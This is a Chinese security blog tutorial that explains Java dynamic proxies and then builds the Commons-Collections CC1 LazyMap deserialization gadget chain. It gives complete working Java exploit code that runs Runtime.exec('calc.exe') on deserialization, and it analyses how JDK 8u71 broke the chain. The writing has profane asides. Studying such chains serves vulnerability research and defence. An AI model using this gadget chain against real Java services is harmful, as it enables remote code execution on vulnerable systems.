---
title: "CC重启之基于动态代理构造的LazyMap CC1及利用二次反序列化的修复"
onlyTitle: true
date: 2024-7-13 22:45:32
categories:
- java
- CC
tags:
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B887.png

---

本文首发于https://www.freebuf.com/vuls/406123.html

前置知识：

## Java动态代理

### 静态代理

假设现在有这么一个需求：

* 创建了一个接口A，里面有display()函数、select()函数、add()函数，类AImpl实现了这三个函数，类AstaticProxy作为类AImpl的日志类，在AImpl每个函数执行完打印“调用了display函数”，调用了"select函数"...类似对AImpl进行装饰

即如下实现代码：

```java
//接口Ainterface
public interface Ainterface {
    public void display();
    public void select();
    public void add();
}
```

```java
//类AImple
public class AImpl implements Ainterface{
    public void display()
    {
        System.out.println("display");
    }
    public void select(){
        System.out.println("select");
    }
    public void add()
    {
        System.out.println("add");
    }
}
```

```java
//AImpl的日志类AstaticProxy，在AImpl实例上添加功能
public class AstaticProxy implements Ainterface{
    private Ainterface aimpl;
    public AstaticProxy(Ainterface a){
        this.aimpl = a;
    }
    public void display()
    {
        aimpl.display();
        System.out.println("调用了display");
    }
    public void select(){
        aimpl.select();
        System.out.println("调用了select");
    }
    public void add()
    {
        aimpl.add();
        System.out.println("调用了add");
    }
}
```

以上就完成了一个静态代理

在主函数中进行测试：

```java
public class AProxyTest {
    public static void main(String[] args) throws Exception
    {
        Ainterface a = new AImpl();
        a.add();
        a.display();
        a.select();
        Ainterface aproxy = new AstaticProxy(a);
        aproxy.add();
        aproxy.display();
        aproxy.select();
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711220409517.png)

这样代理类AstaticProxy中进行的行为是AImpl多余的，不会影响原本的AImpl类，这就叫静态代理。

你也观察到了，三个方法打印，就要写三遍，而且是高度重复的代码，又或者是要在每个函数前面加同一个自定义函数。如果类似Map接口，方法多到离谱，也要冗余的写十几遍吗？此时就有了动态代理。

### 动态代理

java.lang.reflect包下的Proxy类和InvocationHandler接口组合使用就能创建一个动态代理实例

现在让我们舍弃AstaticProxy类，尝试写AdynamicProxy的动态代理类

这个代理类需要实现InvocationHandler接口，该接口内只有一个方法需要实现，就是invoke

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711222419213.png)

在invoke内重写我们需要在每个方法内添加的内容。

在这里我们先不用关心怎么调用这个invoke（也就是如何传参），只需要知道在invoke内怎么使用这三个参数，proxy指代理对象本身，即new AdynamicProxy生成的对象，method是调用的方法，如add()；args是调用方法传的参数，如add()无参方法就是null。

```java
//动态代理类AdynamicProxy，代理实现了Ainterface的类
public class AdynamicProxy implements InvocationHandler {
    private Ainterface a;

    public AdynamicProxy(Ainterface a)
    {
        this.a = a;
    }

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable
    {
        Object result = method.invoke(a, args);
        String methodName = method.getName();
        System.out.println("调用了"+methodName);
        return result;
    }
}
```

使用这个动态代理类，用`Proxy.newProxyInstance`生成代理类对象，看这个函数需要的参数：

第一个参数需要一个ClassLoader，通用写法`.class.getClassLoader()`，第二个参数传接口数组，可以写`new Class[]{Ainterface.class}`，也可以用通用写法`a.getClass().getInterfaces()`，第三个参数传实现了InvocationHandler的代理类，这样就生成了代理类实例。

**调用代理类实例的方法，会执行代理类的invoke方法。**通过反射`Object result = method.invoke(a, args);`调用了AImpl的对应方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110500610.png)

```java
public class AProxyTest {
    public static void main(String[] args) throws Exception
    {
        Ainterface a = new AImpl();
        Ainterface aproxy = (Ainterface) Proxy.newProxyInstance(Ainterface.class.getClassLoader(), new Class[]{Ainterface.class}, new AdynamicProxy(a));
        aproxy.add();
        aproxy.display();
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110426076.png)

且我们看到Proxyk可以序列化。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714162202753.png)

#### newProxyInstance背后的逻辑

我们分析一下newProxyInstance怎么创建的动态代理实例，我们的动态代理类AdynamicProxy里面只有一个构造函数和invoke方法，当然不能直接new生成。这个动态代理实例实际的装配过程就在newProxyInstance。

该函数内大多数代码都是安全检查和获取访问权限，重点在以下三句。最重要的就是getProxyClass0方法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112129827.png)

getProxyClass0方法内，调用了get方法查找缓存内有无已生成的代理类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112555131.png)

这里proxyClassCache是一个WeakCache，WeakCache的get方法如果没有查找到对应键值，会创建一个新的条目，具体创建细节此处省略。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114024588.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713113953632.png)

ProxyClassCache的键是对接口的哈希，如调用的Key1方法，值是ProxyClassFactory工厂类生成的类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114408167.png)

在ProxyClassFactory内就生成了代理实例的类名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114549185.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713152350740.png)

ProxyGenerator.generateProxyClass生成代理实例的字节码，defineClass0加载字节码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114644105.png)

该类下调用的generateClassFile()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114843464.png)

该方法遍历向每个方法中添加了generateMethod()方法，而generateMethod则是生成后的invoke内的代码，到这里就结束分析啦

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115049701.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115155767.png)

所以代理类的实现是重新生成了一个代理对象的class文件，该文件内依此向每个方法添加invoke的内容，最后defineClass加载字节码。让我们来找找这个class文件，验证一下分析。





### 代理对象文件分析

上文介绍了ProxyGenerator.generateProxyClass()方法生成了代理类的字节码文件，我们将这个虚拟机中的文件输出出来。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713140425820.png)



我们调用简化版的generateProxyClass，随便取个名字，传入a.getClass().getInterface()，输出文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713144645805.png)

```java
public class AProxyTest {
    public static void main(String[] args) throws Exception
    {
        Ainterface a = new AImpl();
        byte[] classFile = ProxyGenerator.generateProxyClass("org.example.AProxyExtract", a.getClass().getInterfaces());
        try(FileOutputStream fos = new FileOutputStream("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\AProxyExtract.class")) {
            fos.write(classFile);
            fos.flush();
            System.out.println("代理类class文件写入成功");
        } catch (Exception e) {
            System.out.println("写文件错误");
        }
    }
}
```

在输出的文件中，静态代码块获取了原本接口的方法，赋给`m数字`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151330052.png)

且该类（AProxyExtract）继承了Proxy类，则newProxyInstance生成的子类也可以序列化。

我们直接查看该类里的display方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151732423.png)

super.h就是我们向其父类传的InvocationHandler，也就是`new AdynamicProxy(a)`，可以看到直接调用了这个代理类的invoke方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151852698.png)

就全部能解释通了



### 动态代理类中存在多接口的问题

假设动态代理类为如下代码，请问被代理类可以是哪种，Proxy.newProxyInstance又该怎么传参？

```java
public class AdynamicProxy implements InvocationHandler {
    private Ainterface a;
    private Binterface b;

    public AdynamicProxy(Ainterface a,Binterface b)
    {
        this.a = a;
        this.b = b;
    }

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable
    {
        Object result = method.invoke(a, args);
        String methodName = method.getName();
        System.out.println("调用了"+methodName);
        return result;
    }
}

```

很明显，newProxyInstance可以传多个接口，生成的AdynamicProxy也需要分别传两个实现了A/Binterface接口的类。那AdynamicProxy就同时代理了两个类，但是invoke是执行a中的方法，显然这样写是不行的。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713210623620.png)



把invoke改成如下，getDeclaringClass()判断该方法来自哪个接口，就能同时代理两个类

```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
    Object result;
    if (Ainterface.class.isAssignableFrom(method.getDeclaringClass())) {
        result = method.invoke(a, args);
    } else if (Binterface.class.isAssignableFrom(method.getDeclaringClass())) {
        result = method.invoke(b, args);
    } else {
        throw new IllegalArgumentException("Unsupported interface");
    }
    String methodName = method.getName();
    System.out.println("调用了" + methodName);
    return result;
}
```

相应的，传参如下，根据需要用Ainterface或Binterface存储

```java
        Binterface aproxy = (Binterface) Proxy.newProxyInstance(Ainterface.class.getClassLoader(), 
                new Class[]{Ainterface.class, Binterface.class}, 
                new AdynamicProxy(a,b));

```



## LazyMap链

总结上文动态代理的内容如下：

>动态代理是对一个类下所有方法的代理，用Proxy.newProxyInstance()创建，需要传入一个实现了InvocationHandler，重写了invoke方法的实例。在调用该代理类方法时，会自动跳转执行invoke内的内容。
>
>共需要一个接口，一个实现了该接口的被代理类，一个实现了InvocationHnadler的代理类，最后Proxy.newInstance()创建代理实例。

最简单的TransformedMap链

https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/

中，用TransformeredMap.checkSetValue触发ChainedTransformer.transform。同时我们也能看到LazyMap.get也调用了transform方法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713154230857.png)

我们尝试通读一下LazyMap类，和TransformedMap一样，构造方法是protected类型，通过decorate调用构造函数对map进行装配，只不过这里除了map外只接收了一个Transformer参数。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713190824083.png)

构造函数存储传入的Transformer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191550433.png)

在get函数内，如果map内有以参数key为键的值，则返回该值。如果没有，使用调用factory.transform()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191128650.png)

从以上内容可以看出来，LazyMap.decorate是把传入的Transformer绑定到LazyMap。get函数就是从map中查找以Transfomer为键的值，没有就调用当前Transformer的transform方法，把返回对象做为value添加进map。

也就是：LazyMap意为懒装配Map，不像其他Map，LazyMap的创建只需要传入键，在get时才把键和transform返回的结果put进map。

书接上文https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/

我们构造chainedTransformer代码如下：

```java
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//chainedTransformer1
```

我们控制factory为chainedTransformer，且设置的map中不存在以chainedTransform为键，即可成功调用chainedTransformer.transform()

```java
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
        lazyMap.get("godown");
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713193344329.png)



### AnnotationInvocationHandler动态代理

由于调用到get的方法实在是太多了（所以你能挖出的也很多），官方给出的下一步是在AnnotationInvocationHandler的invoke中调用get方法。

AnnotationInvocationHandler实现了InvocationHandler接口，并重写了invoke方法，典型的代理类！

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200033341.png)

利用反射在私有构造函数中把memberValues设为lazymap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200252091.png)

get的参数member是代理对象调用的方法名，无所谓，不可能是chainedTransformer![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200606754.png)

那我们应该选择哪个被代理类呢？

在get前的代码，如果调用的方法名为equals，toString，hashCode，annotaionType中的任意一个方法都会立刻return，且`assert paramTypes.length == 0;`表示`paramType.length != 0`则抛出AssertionError异常。即不能调用有参方法。只要不是调用以上名字方法，都能成功执行。

代理类只能代理构造函数传入的类，在这里就是继承了Annotation接口的类（即注解），和实现了Map接口的类。

所以哪个注解类或实现了Map接口的类在readObject调用了无参方法呢？就是他本身

AnnotationInvocationHandler本身的readObject里调用了map的一个无参方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713230626575.png)

我们用AnnotationInvocationHandler代理lazyMap，调用这个代理实例的entrySet方法，就能跳转到invoke方法，进而调用get。

```java
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler ProxyInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);
        Map ProxylazyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},ProxyInvocationHandler);
        ProxylazyMap.entrySet();
```

我们用AnnotationInvocationHandler#readObject去触发entrySet()

```java
        Map ProxylazyMap1 = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},ProxyInvocationHandler);
//        ProxylazyMap.entrySet();
        Object ProxylazyMap2 = annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);
        serialize(ProxylazyMap2);
        unserialize("ser.bin");
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713233221047.png)



完整代码：

```java
public class CC1LazyMap {
    public static void main(String[] args) throws Exception
    {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler ProxyInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);
        Map ProxylazyMap1 = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},ProxyInvocationHandler);
//        ProxylazyMap1.entrySet();
        Object ProxylazyMap2 = annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);
        serialize(ProxylazyMap2);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



调用链如下：

```xml
->AnnotationInvocationHandler.readObject()
      ->ProxyLaztMap.entrySet()
          ->AnnotationInvocationHandler.invoke()
            ->LazyMap.get()
                ->ChainedTransformer.transform()
                ->ConstantTransformer.transform()
                    ->InvokerTransformer.transform()
```

其实到AnnotationInvocationHandler.invoke()了，随便找一个类，readObject里含有调用map无参方法。都能完成本条链，或者另外找地方触发LazyMap.get()，毕竟调用get的地方那么多。

后面我们确实也能看到，由于AnnotationInvocationHandler是属于sun.reflect.annotation包，在8u71版本对该类进行了修改。

### 8u71中对AnnotationInvocationHandler#readObject的修复

这部分有一点绕，我们逐步分析。正是因为过于难理解，才是全网没几个人分析的原因吧。可跳过

偷懒8u71sun包链接https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/tip.zip

我们同样的代码在jdk8u71下会报Override missing element entrySet错误，且不弹计算器。其实报错，LayzMap链失效，TransformedMap链失效，是三个不同的问题。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235448070.png)

我们diff一下8u71和8u65的AnnotationInvocationHandler的区别

发现readObject从默认的defaultReadObject变成了readFields()。有的人以为这里就是修复了。实则这两个没区别。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716104945152.png)

在调用 s.readFields() 时，ObjectInputStream 实际上就已经开始读取并解析输入流中的数据，将对象的字段状态反序列化。这个方法会读取所有序列化的字段，并将它们存储在一个 GetField 对象中。GetField 对象充当了一个映射表，其中包含了所有可序列化字段的名称及其对应的值。
当你随后调用 fields.get("fieldName", defaultValue) 来获取某个字段的值时，实际上是从之前已经反序列化并存储在 GetField 对象中的数据中检索这个值。也就是说，反序列化的过程发生在 readFields() 被调用时，而不是在每次 get 方法调用时。跟之前版本的s.defaultReadObject();没区别

经过我调试了一天，他妈的。什么输出中间代理实例来diff，到处断点。我还是没有深刻理解到反序列化的过程。

>我他妈问个傻逼GPT，问他defaultReadObject会不会自动调用对象下涉及到的其他对象的readObject，他他妈的一口咬死说不会。经典不会涉及。
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716143253491.png)
>
>我记得和我脑子里记得不太一样啊，什么readObject链式调用之类的。结果搜集各个资料，回忆涌上心头。
>
>加入对象A包含对象B和C，且B和C都实现了serializable接口，就会自动调用B和C的readObject，不然defaultReadObject反序列化所有字段怎么处理的？他要反序列化他就得触发readObject。真他妈傻逼啊GPT。

知道这个下面就很容易理解了。

我们发现官方在AnnotationInvocationHandler#readObject里把调用返回值传到UnsafeAccessor

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235314083.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714230029547.png)

而UnsafeAccessor的setMemverValues和setType是通过UnSafe对象（学过URLDNS链的同学比较熟悉）直接操作内存，将"memberValues"对象的内存拷贝到指定对象"o"的"memberValuesOffset"偏移位置上。简单来说就是修改对象o的对应字段值。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714234946309.png)

无论是defaultReadObject()还是readFields()，都会自动调用serializable序列化流涉及对象的readObject。

反序列化到代码1的部分时，调用AnnotationInvocationHandler#readObject，此时的streamVals还只是lazyMap，而不是代理实例。而用新建的LinkedHashMap()替换了这个lazyMap。等到代码2调用代理实例的invoke方法时，memberValues已经是LinkedHashMap()了，当然无法跳转到LazyMap.get()。二次触发了readObejct。

在反序列化过程中修改字段值，这就是这里用Unsafe读取内存修改的原因。

```java
//代码1
		Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);


//代码2
        Map ProxylazyMap1 = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        Object ProxylazyMap2 = annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);
        serialize(ProxylazyMap2);
        unserialize("ser.bin");
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144006381.png)

调试也能看出来：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144746103.png)

有同学可能会问：欸，之前构造的时候，其他类的readObject不会影响我们的链吗？

不会，因为Proxy、LazyMap之类的都没有readObject，用的默认的，TransformedMap也是调用默认的defaultReadObejct

至于针对TransformedMap链的修复，是去掉了setValue方法：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145205099.png)

那上面的Override missing element entrySet错误是什么情况？

这是因为下面红框这句，在TransformedMap链里我们为了走进if，把name置为"value"，并且选了有value方法的Target注解才没有报错，而后面我们只需要走进entrySet就触发的LazyMap链，name就没管了。这里取出的name是entrySet，Override取不到entrySet方法，所以报的错。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145428601.png)



寄！TransformedMap和LazyMap的CC1都不能用了。

有任何问题联系我。



参考链接：

https://www.cnblogs.com/gonjan-blog/p/6685611.html
